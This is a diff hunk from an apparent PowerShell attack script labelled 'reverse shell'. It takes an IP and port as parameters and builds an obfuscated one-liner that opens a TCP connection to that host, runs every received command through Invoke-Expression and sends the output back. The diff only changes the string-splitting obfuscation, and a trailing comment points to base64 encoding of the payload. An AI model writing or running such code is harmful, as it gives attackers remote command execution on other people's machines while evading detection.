@@ -2,7 +2,7 @@ param([string]$ip,[string]$port)
 
 #reverse shell
 $code=@'
-$x=(New-Object net.sock''ets.tcpc''lient("~",^)).('gets'+'tream')();[byte[]]$b=0..65535|%{0};while(($i=$x.('rea'+'d')($b,0,$b.Length))-ne 0){$d=([text.encoding]::getencoding(20127)).('getb'+'ytes')(((i''ex((New-Object -t text.('asciie'+'ncoding')).('gets'+'tring')($b,0,$i))2>&1|out-string)+(pwd).path+"> "));$x.write($d,0,$d.Length);$x.flush()}
+$x=(New-Object net.sock''ets.tcpc''lient("~",^)).('gets'+'tream')();[byte[]]$b=0..65535|%{0};while(($i=$x.('rea'+'d')($b,0,$b.Length))-ne 0){$d=([system.text.encoding]::getencoding(20127)).('getb'+'ytes')(((i''ex((New-Object -t text.asciie''ncoding).('gets'+'tring')($b,0,$i))2>&1|out-string)+(pwd).path+"> "));$x.write($d,0,$d.Length);$x.flush()}
 '@ -replace '~',$ip -replace '\^',$port
 
 #convert code to base64
